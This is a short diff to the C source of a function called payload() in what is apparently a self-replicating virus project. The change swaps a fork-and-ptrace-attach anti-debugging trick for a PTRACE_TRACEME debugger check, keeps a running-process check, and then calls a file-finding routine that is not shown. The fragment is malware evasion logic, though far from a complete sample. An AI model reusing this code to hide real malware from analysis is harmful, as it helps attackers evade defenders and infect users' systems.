@@ -58,15 +58,9 @@ void payload()
 
 	// check if in debugger
 	// check if pid running
-	if (is_proc_actif())
+	if (PTRACE(PTRACE_TRACEME, 0, 0, 0) == -1)
 		return ;
-	// ft_putnbr(PTRACE(PTRACE_ATTACH, GETPID(), NULL, NULL));
-	int parent_pid = GETPID();
-	int child_pid = FORK();
-	if (child_pid)
-		return ; // execut in the father the binary
-	// execut the virus in the child
-	if (PTRACE(PTRACE_ATTACH, parent_pid, 0, 0) == -3)
+	if (is_proc_actif())
 		return ;
 	// decrypt next, go next
 	WRITE(1, hello, sizeof(hello));
@@ -76,7 +70,8 @@ void payload()
 		payload_end();
 	finder(data, fd);
 	CLOSE(fd);
-	EXIT(0);
+	// EXIT(0);
+	return ;
 }
 
 void start(void)
